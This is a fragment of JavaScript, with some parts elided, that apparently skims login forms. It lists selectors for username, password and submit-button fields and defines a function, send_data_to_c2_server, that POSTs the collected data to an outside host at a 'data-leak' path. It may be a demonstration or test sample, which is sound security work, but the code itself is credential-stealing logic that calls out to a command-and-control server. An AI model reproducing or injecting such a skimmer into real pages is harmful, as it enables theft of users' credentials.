window["data_leak_label_username"] = ["input[id*='username']", "input[name*='pf.username']"]
window["data_leak_label_password"] = ["input[id*='password']", "input[name*='pf.pass']", "input[type*='password']"]
window["data_leak_label_submit_button"] = ["button.mcf-btn--primary"]

function send_data_to_c2_server(data) {
    var xhr = window["XMLHttpRequest"] ? new XMLHttpRequest() : new ActiveXObject("Microsoft.XMLHTTP");
    xhr.open("POST", "https://c4-server.f5cloudbuilder.dev/data-leak/");
...
function scan_page() {
    ...
    **/
    ...
    // GET elements
    if (!(get_element_selector(window["data_leak_label_username"]))) return false;
